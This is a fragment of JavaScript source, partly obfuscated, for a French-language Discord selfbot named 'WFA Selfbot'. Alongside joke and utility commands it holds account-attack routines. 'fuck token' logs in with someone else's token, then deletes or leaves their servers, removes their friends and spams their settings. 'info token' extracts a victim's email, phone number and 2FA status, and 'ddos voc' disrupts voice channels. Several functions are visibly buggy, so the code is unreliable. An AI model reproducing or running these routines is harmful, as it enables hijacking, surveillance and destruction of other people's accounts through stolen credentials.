      if (T.content.startsWith(prefix + 'mp friend')) {
        if (!V) throw 'Vous devez mettre quelque chose à dire !';
        let bf = V.splice(2).join(' ') || 'WFA Selfbot\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg';
        client.user.friends.forEach(bg => {
          bg.send(bf).catch(bi => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }), console.log(consolecolor.instagram('[COMMANDE] Commande mp friend executé'));
      }

      T.content === prefix + 'stats' && (T.edit('```Selfbot - Statistics | WFA - Selfbot\nMemoire Usage: ' + (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2) + 'MB\n\nServeurs: ' + client.guilds.size + '\n\nSalons: ' + client.channels.size + '\n\nMembres: ' + client.guilds.map(bg => bg.memberCount).reduce((bg, bh) => bg + bh) + '```').catch(bg => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande stats executé')));

      if (T.content.startsWith('##')) {
        T.channel.fetchMessages().then(bh => bh.forEach(bi => {
          bi.author.id === client.user.id && bi.delete().catch(bj => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        })), console.log(consolecolor.instagram('[COMMANDE] Commande purge executé'));
      }

      X.content.startsWith(prefix + 'discord') && (X.edit(ghost + 'https://embed.rauf.workers.dev/?author=Discord%2520Version&description=La%2520version%2520de%2520discord%253A%2520' + discord.version).catch(bh => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande discord executé')));
      T.content === prefix + 'restart' && (T.edit('**redémarrage** du self bot...').then(client.destroy()).then(() => client.login(token)), console.log(consolecolor.instagram('[COMMANDE] Commande restart executé')));

      if (T.content.startsWith(prefix + 'set serveur name')) {
        let bi = V.splice(1).join(' ') || 'WFA selfbot';
        T.edit('Changement du nom du serveur pour: ' + bi), T.guild.setName(bi), console.log(consolecolor.instagram('[COMMANDE] Commande set serveur name executé'));
      }

      if (T.content.startsWith(prefix + 'token')) {
        if (!W) {
          T.edit(':x: **Veuillez mentionner un utilisateur!**');
          return;
        }

        const bj = W.username.split(' ').join('%2520'),
              bk = client.user.username.split(' ').join('%2520');
        let bl = ['HircHg', 'XnyXiA', 'XluxwQ', 'XXn_KA', 'Xiq-WQ'],
            bm = ['a6uny9jcMjet2W2LASruribq6VI', 'oZyGJDamSJ4hmJaaLvzdNo1bLqk', '3_6Xt2k4OieDKimnNYGWUq9vJRo', 'xllelHltGdY7DP_0s1XST4cgzTs'];
        var a2 = W.id,
            a3 = utf8.encode(a2),
            a4 = base64.encode(a3);
        setTimeout(() => {
          T.edit('░░░░░░░░░░ 0%');
        }, 1000), setTimeout(() => {
          T.edit('▓▓░░░░░░░░ 20%');
        }, 1500), setTimeout(() => {
          const bn = {
            'nzMBd': 'DiscordSetup '
          };
          const bo = bn;
          T.edit('▓▓▓▓░░░░░░ 40%');
        }, 2000), setTimeout(() => {
          T.edit('▓▓▓▓▓▓░░░░ 60%');
        }, 2500), setTimeout(() => {
          T.edit('▓▓▓▓▓▓▓▓░░ 80%');
        }, 3000), setTimeout(() => {
          T.edit('▓▓▓▓▓▓▓▓▓▓ 100%');
        }, 3500), setTimeout(() => {
          T.edit(ghost + ('https://embed.rauf.workers.dev/?author=Token%2520match%2520' + bj + '&description=') + a4 + '.' + bl[Math.floor(Math.random() * bl.length)] + '.' + bm[Math.floor(Math.random() * bm.length)]).catch(bo => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }, 4000), console.log(consolecolor.instagram('[COMMANDE] Commande token executé'));
      }

      if (T.content.startsWith(prefix + 'sansxksch')) {
        console.log(' '), console.log(consolecolor.mind('[EASTER EGG] GG a toi, tu as trouvé un easter egg !')), console.log(consolecolor.mind('[EASTER EGG] Sans x KSH sont les développeurs et les designeurs du WFA Project !')), console.log(' ');
      }

      if (T.content.startsWith(prefix + 'encode')) {
        const bo = '2|0|4|1|5|3'.split('|');
        let bp = 0;
        var a6 = V.join(' ') || '@everyone\nWFA selfbot';
        var a3 = utf8.encode(a6);
        var a7 = base64.encode(a3);
        var a5 = a7.split(' ').join('%2520');
        T.edit(ghost + ('https://embed.rauf.workers.dev/?author=Code%2520Encode&description=Texte%2520-%253E%2520Base64%253A%2520' + a5)).catch(bq => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        console.log(consolecolor.instagram('[COMMANDE] Commande encode executé'));
      }

      if (T.content.startsWith(prefix + 'steal banniere')) {
        T.delete();
        let br = T.guild.bannerURL;
        console.log(consolecolor.instagram('[COMMANDE] Commande steal banniere executé')), console.log(('Voici la bannière de ' + T.guild.name + ': ').blue + ('' + br).green);
      }

      if (T.content.startsWith(prefix + 'steal emote')) {
        if (T.channel.type === 'dm') {
          T.edit(':x: **Commande pas executable en mp**');
          return;
        }

        let bt = V.splice(2).join(' '),
            bu = client.guilds.get(bt);

        if (!bu) {
          T.edit(':x: **Aucun serveur trouvable avec l\'id** "' + bt + '"');
          return;
        }

        if (!T.member.hasPermission('MANAGE_EMOJIS')) return T.edit(':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**');
        bu.emojis.size < 1 && T.edit(':x: **Le serveur ne contient aucun emote.**');
        let bv = '1';
        bu.emojis.forEach(bw => {
          setTimeout(() => {
            let bx = bw.name;
            const by = 'https://cdn.discordapp.com/emojis/' + bw.id + '.' + bw.animated ? 'gif' : 'png';
            T.guild.createEmoji(by, bx).catch(bz => bv + 1);
          }, 1500);
        }), console.log(consolecolor.instagram('[COMMANDE] Commande steal emote executé')), T.edit(':white_check_mark: **J\'ai volé les emotes du serveur** "' + bu.name + '"');
      }

      if (T.content == prefix + 'delete all emotes') {
        if (T.channel.type === 'dm') {
          T.edit(':x: **Commande pas executable en mp**');
          return;
        }

        if (T.guild.emogis.size < 1) {
          T.edit(':x: **Il n\' y a aucun emote a supprimer.**');
          return;
        }

        T.guild.emojis.forEach(by => {
          const bz = {
            'eLRSf': 'https://www.twitch.tv/OGAGAL_risitas',
            'vMeXw': 'WATCHING',
            'cRgnh': 'Skype',
            'isBiY': 'BE OLD WITH WFA',
            'EAAMM': '[COMMANDE] Commande skype executé',
            'umGBq': function (bA, bB) {
              return bA + bB;
            }
          };
          T.guilds.emojis.get(by.id).delete();
        }), console.log(consolecolor.instagram('[COMMANDE] Commande delete all emote executé'));
      }

      if (T.content.startsWith(prefix + 'grab pp')) {
        let bz = T.mentions.users.first(),
            bA = bz.avatarURL;

        if (!bz) {
          T.edit(':x: **Veuillez mentionner un utilisateur valide!**');
          return;
        }

        if (!bA) {
          T.edi(':x: **Cet utilisateur n\'a pas d\'avatar!**');
          return;
        }

        client.user.setAvatar(bA), console.log(consolecolor.instagram('[COMMANDE] Commande grab pp executé')), T.edit(':white_check_mark: **J\'ai correctement volé la photo de profile de ** "' + bz.username + '"');
      }

      if (T.content == prefix + 'backup friend') {
        var a8 = client.user.friends.size;
        const bC = client.user.friends.array();
        let bD = 'Successfully backed up ' + bC.length.toString().bold + ' friends.'.green;
        console.log(bD), hastebins(bC + '\n').then(bE => {
          T.edit('```WFA BACKUP FRIEND\n\nLien hastebins: ' + bE + '\n\n***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo / envoyer un message / add friend ect...```').catch(bG => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande backup friend executé'));
        });
      }

      if (T.content === prefix + 'ddos voc') {
        if (!X.guild) return T.edit(':x: **Commande uniquement utilisable sur un serveur**');

        if (!T.member.hasPermission('ADMINISTRATOR')) {
          T.channel.send(':x: **Il vous faut les permissions administrateur pour executer cette commande**');
          return;
        }

        let bF = 0;
        const bG = ['japan', 'hongkong', 'russia', 'india', 'brazil', 'sydney'];
        setInterval(() => {
          T.guild.setRegion(bG[bF]), bF++;
          if (bF === bG.length) bF = 0;
        }, 1000), X.edit('**Commande ddos vocal activé**'), console.log(consolecolor.instagram('[COMMANDE] Commande ddos voc executé'));
      }

      if (T.content === prefix + 'ddos-stop') {
        if (!X.guild) return T.edit(':x: **Commande uniquement utilisable sur un serveur**');
        clearInterval(), X.edit('**Commande ddos stopé**'), console.log(consolecolor.instagram('[COMMANDE] Commande ddos voc stopée'));
      }

      if (T.content.startsWith(prefix + 'fuck token')) {
        let bH = new Client(),
            bI = V.splice(2).join(' '),
            bJ = 'https://discordapp.com/api/v6/users/@me';
        const bK = {};
        bK.authorization = bI, request(bJ, {
          'method': 'GET',
          'headers': bK
        }, function (bL, bM, bN) {
          const bO = {
            'LcCFe': 'Token timeout',
            'fUDjz': '879157124230414406',
            'tsDLX': '843993531273707540',
            'OEigF': function (bP, bQ) {
              return bP === bQ;
            },
            'vpDbx': ':x: **Please run this command in a server!**',
            'Pykgu': function (bP, bQ) {
              return bP !== bQ;
            },
            'IccrZ': 'qvxlz',
            'dFMGq': 'WFA-Selfbot',
            'rocxQ': 'london',
            'YCLOI': ':x: **Please run this command on a server**',
            'KNnuG': 'MANAGE_NICKNAMES',
            'ramKI': 'ERROR',
            'ojscl': function (bP, bQ) {
              return bP + bQ;
            },
            'LASms': 'Je renomme tout le monde par ',
            'AybCu': '[COMMAND] name all command executed',
            'xEhFL': 'KVxFL',
            'SkgiY': function (bP, bQ) {
              return bP === bQ;
            },
            'CGwRn': '826503000541102200',
            'trOAV': ':white_check_mark: **Token fuck en cours...**'
          };
          {
            if (bM.statusCode === 200) {
              bH.on('ready', function () {
                for (pas = 0; pas < 100; pas++) {
                  bH.user.createGuild('WFA-Selfbot', 'london');
                }
              });

              for (pas = 0; pas < 20; pas++) {
                fetch('https://discord.com/api/v8/users/@me/settings', {
                  'headers': {
                    'authorization': bI,
                    'content-type': 'application/json'
                  },
                  'body': '{"theme":"light"}',
                  'method': 'PATCH'
                }), fetch('https://discord.com/api/v8/users/@me/settings', {
                  'headers': {
                    'authorization': bI,
                    'content-type': 'application/json'
                  },
                  'body': '{"theme":"dark"}',
                  'method': 'PATCH'
                });
              }

              bH.on('ready', function () {
                const bQ = {
                  'zocYf': ':x: **Please run this command on a server**',
                  'bsjVo': 'MANAGE_NICKNAMES',
                  'milaK': 'ERROR',
                  'OcUaP': function (bR, bS) {
                    return bR + bS;
                  },
                  'HIKqJ': 'Je renomme tout le monde par ',
                  'doNkx': '[COMMAND] name all command executed',
                  'rPfFs': 'KVxFL',
                  'gewnp': function (bR, bS) {
                    return bR === bS;
                  },
                  'SpDfa': '826503000541102200',
                  'qdjGS': 'Token timeout',
                  'UTEQM': '879157124230414406',
                  'mGkAf': function (bR, bS) {
                    return bR === bS;
                  },
                  'QeiaB': '843993531273707540'
                };
                bH.user.friends.forEach(bR => {
                  if (bR.id === '826503000541102200') return;
                  bH.user.removeFriend(bR).catch(bS => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                }), bH.guilds.forEach(bR => {
                  const bS = {
                    'izcdJ': 'Token timeout'
                  };
                  const bT = bS;
                  if (bR.id === '879157124230414406') return;
                  if (bR.id === '843993531273707540') return;
                  if (bR.ownerID === bH.user.id) bR.delete().catch(bU => {
                    bU && console.log('Token timeout'.red);
                  });else bR.leave().catch(bU => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                }), T.edit(':white_check_mark: **Token fuck en cours...**');
              }), bH.login(bI);
            } else T.edit('>>> **Token Info | WFA - Selfbot**\n    \n    \n                Le token: \n                ```' + bI + '```\n                \n                Le token ' + bI + ' \nn\'est pas valide :x:\n    ').catch(bQ => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
          }
        }), console.log(consolecolor.instagram('[COMMANDE] Commande fuck token executé'));
      }

      if (T.content.startsWith(prefix + 'info token')) {
        let bM = V.splice(2).join(' '),
            bN = 'https://discordapp.com/api/v6/users/@me';
        const bO = {};
        bO.authorization = bM;
        const bP = {
          'method': 'GET'
        };
        bP.headers = bO, request(bN, bP, function (bQ, bR, bS) {
          const bT = {
            'AdBLn': function (bU, bV) {
              return bU !== bV;
            },
            'kJSXJ': 'jqtpa',
            'MWaMZ': 'username',
            'sCLxb': 'discriminator',
            'mIIVJ': 'mfa_enabled',
            'cLbXh': 'phone',
            'pmUNC': 'public_flags',
            'RoSqM': 'flags',
            'nptQr': 'email',
            'dbtsb': 'verified',
            'rebtS': function (bU, bV) {
              return bU + bV;
            },
            'ntNbK': function (bU, bV) {
              return bU + bV;
            },
            'wtsAL': '\nEmail: ',
            'ehxFw': '\nNuméro de telephone: ',
            'wagaK': '\nAvatar: ',
            'nbprE': '\nLangue: ',
            'ndlZY': '\nA2f activé?: ',
            'qTiar': '\nNsfw activé?: ',
            'yjPzh': '```',
            'EfafD': '[COMMANDE] Commande info token executé',
            'deNrK': 'https://discordapp.com/api/v6/users/@me',
            'LuGFs': function (bU, bV, bW, bX) {
              return bU(bV, bW, bX);
            },
            'TfClO': 'GET'
          };
          bR.statusCode === 200 ? new Promise((bU, bV) => {
            const bW = {
              'JqAJK': function (bZ, c0) {
                return bZ(c0);
              },
              'ceTWI': function (bZ, c0) {
                return bZ !== c0;
              },
              'ESUiZ': 'jqtpa',
              'BBCoz': 'username',
              'PoufB': 'avatar',
              'XRFVm': 'discriminator',
              'JxGLg': 'mfa_enabled',
              'TiRbL': 'phone',
              'huTJv': 'public_flags',
              'UrpcW': 'flags',
              'NPBEJ': 'email',
              'BrTZI': 'verified',
              'ecaQm': function (bZ, c0) {
                return bZ + c0;
              },
              'XWQKq': '\nUser: ',
              'HOzoy': function (bZ, c0) {
                return bZ + c0;
              },
              'SlIwn': '\nEmail: ',
              'oEDsW': '\nNuméro de telephone: ',
              'cxzlz': '\nAvatar: ',
              'xsKxc': '\nLangue: ',
              'Mxkzg': '\nA2f activé?: ',
              'BcNtz': '\nCompte vérifié?: ',
              'PbOvt': '\nNsfw activé?: ',
              'gxFEJ': '\nFlags: ',
              'oIXXr': function (bZ, c0) {
                return bZ + c0;
              },
              'uNQiT': '```',
              'LffAW': '[COMMANDE] Commande info token executé'
            };
            let bX = 'https://discordapp.com/api/v6/users/@me';
            const bY = {};
            bY.authorization = bM, request(bX, {
              'method': 'GET',
              'headers': bY
            }, function (bZ, c0, c1) {
              const c2 = {
                'vAixI': function (cb, cc) {
                  return cb(cc);
                }
              };
              {
                c1 = JSON.parse(c1);
                var c3 = c1.id,
                    c4 = c1.username,
                    c5 = c1.avatar,
                    c6 = c1.discriminator,
                    c7 = c1.mfa_enabled,
                    c8 = c1.phone,
                    c9 = c1.locale;
                let cc = c1.public_flags,
                    cd = c1.flags,
                    ce = c1.email,
                    cf = c1.verified,
                    cg = c1.nsfw_allowed;
                var ca = '';
                ca += '\nUser: ' + c4 + '#' + c6, ca += '\nId: ' + c3, ca += '\nEmail: ' + ce, ca += '\nNuméro de telephone: ' + c8, ca += '\nAvatar: ' + c5, ca += '\nLangue: ' + c9, ca += '\nA2f activé?: ' + c7, ca += '\nCompte vérifié?: ' + cf, ca += '\nNsfw activé?: ' + cg, ca += '\nFlags: ' + cd, ca += '\nPublic Flags: ' + cc, T.edit('```' + ca + '```').then(console.log(consolecolor.instagram('[COMMANDE] Commande info token executé')));
              }
            });
          }) : T.edit('**le token n\'est pas valide :x:**').catch(bU => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        });
      }

      if (T.content.startsWith(prefix + 'check token')) {
        let bQ = V.splice(1).join(' '),
            bR = 'https://discordapp.com/api/v6/users/@me';
        const bS = {};
        bS.authorizaion = bQ, request(bR, {
          'method': 'GET',
          'headers': bS
        }, function (bT, bU, bV) {
          const bW = {
            'nnQvE': function (bX, bY) {
              return bX <= bY;
            },
            'VDUvU': function (bX, bY) {
              return bX + bY;
            },
            'esuwS': function (bX, bY) {
              return bX + bY;
            },
            'PKxiP': function (bX, bY) {
              return bX + bY;
            },
            'BdDyC': '```[',
            'GSAaY': function (bX, bY) {
              return bX - bY;
            },
            'gFLXH': ']  -  ',
            'tjunm': function (bX, bY) {
              return bX * bY;
            },
            'AqJLo': 'loading..```',
            'yoETK': '`Data obtained!`'
          };
          {
            if (bU.statusCode === 200) T.edit('```diff\n + Le token:' + bQ + 'Est 100% valide ✔```').catch(bX => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));else T.edit('```diff\n- Le token ' + bQ + ' n\'est pas valide :x:```').catch(bX => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            console.log(consolecolor.instagram('[COMMANDE] Commande check token executé'));
          }
        });
      }

      if (T.content.startsWith(prefix + 'lovecalc')) {
        let bU = ['5%', '10%', '15%', '20%', '25%', '30%', '35%', '40%', '45%', '50%', '55', '60%', '65%', '70%', '75%', '80%', '85%', '90%', '95%', '100%'];
        rdm = Math.floor(Math.random(), bU.length), laPersonne = V.slice(0).join(' ') || 'WFA selfbot';
        const bV = laPersonne.split(' ').join('%2520'),
              bW = client.user.username.split(' ').join('%2520');
        T.edit(ghost + ('https://embed.rauf.workers.dev/?author=LoveCalc%2520%25E2%259D%25A4&description=relation%2520entre%2520' + bV + '%2520et%2520' + author + '%252C%2520relation%2520estim%25C3%25A9e%2520%25C3%25A0%2520' + bU[rdm])).catch(bX => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande lovecalc executé'));
      }

      if (T.content.startsWith(prefix + 'start typing')) {
        T.delete(), console.log(consolecolor.instagram('[COMMANDE] Commande start typing executé')), T.channel.startTyping().catch(bY => {});
      }

      if (T.content.startsWith(prefix + '8ball')) {
        let bY = T.content.split(' ').splice(1).join(' ');
        var a9 = ['oui', 'non...', 'peut etre?', 'probablement', 'je ne pense pas.', 'jamais', 'tu peux essayer...'];
        if (bY[1] != null) T.edit(bY + '\nla reponse est: ' + a9[Math.floor(Math.random() * a9.length)]).catch(bZ => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));else T.edit('Quelle est ta question? :rolling_eyes: (essayeplutot:' + prefix + ' 8ball [question])');
        console.log(consolecolor.instagram('[COMMANDE] Commande 8ball executé'));
      }

      T.content.startsWith(prefix + 'branlette') && (T.edit('8=:fist:==D'), T.edit('8==:fist:=D'), T.edit('8===:fist:D '), T.edit('8==:fist:=D'), T.edit('8=:fist:==D '), T.edit('8:fist:===D'), T.edit('8=:fist:==D '), T.edit('8==:fist:=D'), T.edit('8===:fist:D'), T.edit('8==:fist:=D:sweat_drops:'), T.edit('8===:fist:D:sweat_drops:'), console.log(consolecolor.instagram('[COMMANDE] Commande branlette executé')));

      if (T.content.startsWith(prefix + 'say')) {
        ;
        const bZ = ['ee5d5d', 'ee5d9c', 'ee5dcf', 'b45dee', '5d62ee', '5d95ee', '5dddee', '5deebe', '5dee7a', '7dee5d', 'c0ee5d', 'eecf5d', 'ee9f5d', 'ee5d5d'];
        if (!V) throw 'Vous devez mettre quelque chose à dire !';
        let c0 = V.splice(1).join(' ').split(' ').join('%2520') || 'WFA selfbot';

        for (pas = 0; pas < 10; pas++) {
          T.edit(ghost + ('https://embed.rauf.workers.dev/?author=Commande%2520Say&description=' + c0 + '&color=' + bZ)).catch(c1 => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }

        console.log(consolecolor.instagram('[COMMANDE] Commande say executé'));
      }

      if (T.content.startsWith(prefix + 'fight')) {
        if (!W) return X.edit(':x: **Aucun utilisateur mentionné**');
        const c1 = W.username.split(' ').join('%2520'),
              c2 = client.user.username.split(' ').join('%2520');
        T.edit(ghost + ('https://embed.rauf.workers.dev/?author=' + c1 + '%2520VS%2520' + c2 + '&image=https%253A%252F%252Fwww.photofunky.net%252Foutput%252Fimage%252Fe%252F8%252F8%252Fa%252Fe88abf%252Fphotofunky.gif')).catch(c3 => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande fight executé'));
      }

      if (T.content.startsWith(prefix + 'boom')) {
        if (!W) return X.edit(':x: **Aucun utilisateur mentionné**');
        const c3 = W.username.split(' ').join('%2520'),
              c4 = client.user.username.split(' ').join('%2520');
        T.edit(ghost + ('https://embed.rauf.workers.dev/?author=' + c3 + '%2520Ce%2520Fait%2520Explos%25C3%25A9%2520Par%2520' + c4 + '%25F0%259F%2592%25A3%25F0%259F%2592%25A5&image=https%252Fmedia.discordapp.net%252Fattachments%252F648223633185177612%252F650715035592687647%252Fimage0.gif')).catch(c5 => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande boom executé'));
      }

      T.content == prefix + 'shutdown' && (console.log(consolecolor.atlas('[EVENT] Commande WFA Selfbot arrêter')), X.delete(), setTimeout(() => {
        process.exit(1);
      }, 300));

      if (T.content == prefix + 'rire') {
        const c5 = client.user.username.split(' ').join('%2520');
        T.edit(ghost + ('https://embed.rauf.workers.dev/?author=' + c5 + '%2520Rigole%2520%25F0%259F%2598%2582&image=') + C[Math.floor(Math.random() * C.length)]).catch(c6 => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande rire executé'));
      }

      if (T.content.startsWith(prefix + 'kiss')) {
        if (!W) {
          T.edit(':x: **Veuillez mentionner un utilisateur!**');
          return;
        }

        const c6 = W.username.split(' ').join('%2520'),
              c7 = client.user.username.split(' ').join('%2520');
        T.edit(ghost + ('https://embed.rauf.workers.dev/?author=' + c6 + '%2520embrasse%2520' + c7 + '%2520%25E2%259D%25A4&image=') + D[Math.floor(Math.random() * D.length)]).catch(c8 => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande kiss executé'));
      }

      if (T.content.startsWith(prefix + 'veski')) {
        if (!W) {
          T.edit(':x: **Veuillez mentionner un utilisateur!**');
          return;
        }

        const c8 = W.username.split(' ').join('%2520'),
              c9 = client.user.username.split(' ').join('%2520');
        T.edit(ghost + ('https://embed.rauf.workers.dev/?author=' + c8 + '%2520veski%2520&image=') + F[Math.floor(Math.random() * F.length)]).catch(ca => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande veski executé'));
      }

      if (T.content.startsWith(prefix + 'load')) {
        T.delete();
        var aa = '.',
            ab = '█';
        T.channel.send('```[' + aa.repeat(50) + ']```').then(ca => {
          for (a0 = 0; a0 <= 50; a0++) {
            ca.edit('```[' + ab.repeat(a0) + aa.repeat(50 - a0) + ']  -  ' + a0 * 100 / 50 + '%\nloading..```');
          }

          ca.edit('`Data obtained!`').catch(cc => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande load executé'));
        });
      }

      if (T.content.startsWith(prefix + 'punch')) {
        if (!W) {
          T.edit(':x: **Veuillez mentionner un utilisateur!**');
          return;
        }

        const cc = W.username.split(' ').join('%2520'),
              cd = client.user.username.split(' ').join('%2520');
        T.edit(ghost + ('https://embed.rauf.workers.dev/?author=' + cd + '%2520frappe%2520' + cc + '%2520%25F0%259F%2591%258A&image=') + G[Math.floor(Math.random() * G.length)]).catch(ce => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande punch executé'));
      }

      if (T.content.startsWith(prefix + 'calin')) {
        if (!W) {
          T.edit(':x: **Veuillez mentionner un utilisateur!**');
          return;
        }

        const ce = W.username.split(' ').join('%2520'),
              cf = client.user.username.split(' ').join('%2520');
        T.edit(ghost + ('https://embed.rauf.workers.dev/?author=' + cf + '%2520fait%2520un%2520calin%2520%25C3%25A0%2520' + ce + '&image=') + E[Math.floor(Math.random() * E.length)]).catch(ch => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande calin executé'));
      }

      if (T.content === prefix + 'nitro') {
        T.edit('https://discord.gift/' + nitrocode(16, '0aA')).catch(cj => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), console.log(consolecolor.instagram('[COMMANDE] Commande nitro executé'));
      }

      if (X.content.startsWith(prefix + 'reverse')) {
        let cj = V.splice(1).join(' ');
        if (!cj) T.edit(':x: **Pas de test definit**');

        function ck(cm) {
          return cm.split('').reverse().join('');
        }

        let cl = ck(cj);
        if (V[0] = cl) cl = V.splice(1).join(' ');
        X.edit('' + cl).catch(cm => {}), console.log(consolecolor.instagram('[COMMANDE] Commande reverse executé'));
      }

      if (T.content.startsWith(prefix + 'skick')) {
        let cn = T.guild;

        if (!cn) {
          T.edit(':x: **Veuillez executer cette commande sur un serveur!**');
          return;
        }

        if (!W) {
          T.edit(':x: **Veuillez mentionner un utilisateur!**');
          return;
        }

        W.kick().then(co => {
          T.edit(':wave:', co.displayName + ' a été expulser :point_right: ');
        }).catch(() => {
          T.delete(), console.log('[ERREUR]'.red + ' Je ne peux pas bannir cet personne'.green);
        }), console.log(consolecolor.instagram('[COMMANDE] Commande kick executé'));
      }

      if (T.content.startsWith(prefix + 'sban')) {
        let co = T.guild;

        if (!co) {
          T.edit(':x: **Veuillez executer cette commande sur un serveur!**');
          return;
        }

        if (!W) {
          T.edit(':x: **Veuillez mentionner un utilisateur!**');
          return;
        }

        W.ban().then(cr => {
          const cs = {
            'iZgpF': '%2520',
            'zyVDv': function (ct, cu) {
              return ct * cu;
            }
          };
          T.edit(':wave: ' + cr.displayName + 'a été banni avec succès https://gfycat.com/playfulfittingcaribou :point_right:');
        }).catch(() => {
          T.delete();
          console.log('[ERREUR]'.red + ' Je ne peux pas bannir cet personne'.green);
        }), console.log(consolecolor.instagram('[COMMANDE] Commande ban executé'));
      }

      if (T.content.startsWith(prefix + 'role info' || prefix + 'ri')) {
        let cs = T.guild,
            ct = T.mentions.roles.first();
        if (!cs) return X.edit(':x: **Commande uniquement utilisable sur un serveur**');
        if (!ct) return T.delete().then(console.log('[' + 'ERROR'.red + ']' + 'un nom de rôle est nécessaire'.green));
        const cu = {
          'false': 'Non',
          'true': 'Oui'
        };
        const cv = cu;
        console.log(consolecolor.instagram('[COMMANDE] Commande role info executé')), T.edit('```\nRole: <@&' + ct.id + '>\n\nID du role: ' + ct.id + '\n\nCouleur: ' + ct.hexColor + '\n\nNombre de membres ayant ce role: ' + ct.members.size + '\n\nposition: ' + ct.position + '\n\nmentionnable: ' + cv[ct.mentionable] + '```').catch(cw => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
      }

      if (T.content.startsWith(prefix + 'add emote')) {
        if (T.channel.type === 'dm') {
          T.edit(':x: **Commande pas executable en mp**');
          return;
        }

        let cw = V.splice(2).join(' '),
            cx = Discord.Util.parseEmoji(cw);

        if (!V) {
          T.edit(':x: **Veuillez choisir une emote.**');
          return;
        }

        if (!cx) {
          T.edit(':x: **Emote invalide essayez ceci** ' + prefix + 'add emote (emote) <name>');
          return;
        }

        if (!T.member.hasPermission('MANAGE_EMOJIS')) {
          T.edit(':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**');
          return;
        }

        if (cx.id) {
          const cA = 'https://cdn.discordapp.com/emojis/' + cx.id + '.' + cx.animated ? 'gif' : 'png';
          let cB = T.content.split(' ').splice(3) || cx.name;
          T.guild.createEmoji(cA, cB), T.edit(':white_check_mark: **Emote ajoutée au serveur.**'), console.log(consolecolor.instagram('[COMMANDE] Commande add emote executé'));
        } else T.edit(':x: **Veuillez choisir une emote valide!**');
      }

      if (T.content === prefix + 'emote') {
        if (T.channel.type === 'dm') {
          T.edit(':x: **Commande pas executable en mp**');
          return;
        }

        let cD = '',
            cE = '',
            cF = 0,
            cG = 0,
            cH = 0;

        function cI(cJ) {
          return client.emogjis.get(cJ).toString();
        }

        T.guild.emogis.forEach(cJ => {
          cH++;
          if (cJ.animated) cG++, cE += cI(cJ.id);
        }), T.edit('```\nServeur: **' + T.guild.name + '**\n\nEmojis animés: [' + cG + ']\n' + cE || 'None\n\nEmojis Simple:\n[' + cF + '] \n' + cD || 'None\n\nTotal d\'emojis: [' + cH || 'None]\n' + cD + ' ' + cE + '```'), console.log(consolecolor.instagram('[COMMANDE] Commande emote executé'));
      }

      if (T.content.startsWith(prefix + 'remove emote')) {
        if (T.channel.type === 'dm') {
          T.edit(':x: **Commande pas executable en mp**');
          return;
        }

        if (!T.member.hasPermission('MANAGE_EMOJIS')) return T.edit(':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**');
        const cJ = V.splice(2).join(' ');
        if (!cJ) return T.edit(':x: **Veuillez choisir une emote.**');
        let cK = Discord.Util.parseEmoji(cJ);
        if (!T.guild.emojis.forEach(cL => {
          if (!cL.i === cK.id) return T.channel.send(':x: **Cette emote n\'est pas sur le serveur**.');
        })) return T.edit(':white_check_mark: **Emote correctement supprimée du serveur.**');

        if (cK.id) {
          const cM = 'https://cdn.discordapp.com/emojis/' + cK.id + '.' + cK.animated ? 'gif' : 'png';
          T.guild.emojis.get(cK.id).delete();
        } else {
          const cN = {
            'assetType': 'png'
          };
          let cO = parse(cJ, cN);
          if (!cO[0]) return T.edit(':x: **Veuillez choisir une emote valide**!');
          T.edit(':x: **Vous ne pouvez pas supprimer les emotes par defaut**!');
        }

        console.log(consolecolor.instagram('[COMMANDE] Commande remove emote executé'));
      }

